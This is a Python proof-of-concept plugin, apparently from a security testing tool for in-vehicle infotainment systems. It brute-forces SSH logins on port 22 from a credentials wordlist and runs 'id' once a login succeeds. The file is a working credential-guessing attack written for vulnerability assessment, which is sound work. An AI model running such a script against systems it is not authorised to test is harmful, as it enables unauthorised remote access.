"""
PoC Name: SSH Weak Credentials
CVE: N/A
Component: Network Stack
Category: Network
Severity: High
CVSS: 8.0
Description: 车机SSH服务弱口令检测(12组常见默认密码)
Prerequisites: 目标SSH端口(22)开放, 需要paramiko库。
Usage: python3 10_SSH_Weak_Creds.py <target_ip>
"""
import socket
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

class SSHWeakCredsPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        return True

    def exploit(self):
        port = 22
        self.logger.info(f"检测SSH弱口令 {self.target_ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            if s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("SSH端口22关闭")
                self.results["vulnerable"] = False
                s.close()
                return self.results
            s.close()
        except:
            self.results["vulnerable"] = False
            return self.results

        self.logger.info("SSH端口开放,开始弱口令测试...")
        try:
            import paramiko
            import os
            
            wordlist_path = os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt')
            if not os.path.exists(wordlist_path):
                self.logger.error("未找到字典文件 credentials.txt")
                self.results["vulnerable"] = False
                return self.results
                
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or ':' not in line:
                        continue
                        
                    parts = line.split(':', 1)
                    user = parts[0]
                    passwd = parts[1]
                    
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        # Reduce timeout to 2 seconds per attempt to speed up dictionary attack
                        client.connect(self.target_ip, port=port, username=user,
                                       password=passwd, timeout=2, banner_timeout=2)
                        self.logger.warning(f"[+] 发现弱口令: {user}/{passwd}")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = f"SSH login: {user}/{passwd}"
                        stdin, stdout, stderr = client.exec_command("id")
                        self.logger.info(f"    命令输出: {stdout.read().decode().strip()}")
                        client.close()
                        return self.results
                    except paramiko.AuthenticationException:
                        continue
                    except Exception:
                        # Other connection errors like timeout, reset, etc. break out of inner loop
                        break
                        
            self.logger.info("字典耗尽,未发现弱口令")
            self.results["vulnerable"] = False
        except ImportError:
            self.logger.error("paramiko未安装,跳过SSH弱口令测试")
            self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 10_SSH_Weak_Creds.py <target_ip>")
        sys.exit(1)
    plugin = SSHWeakCredsPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
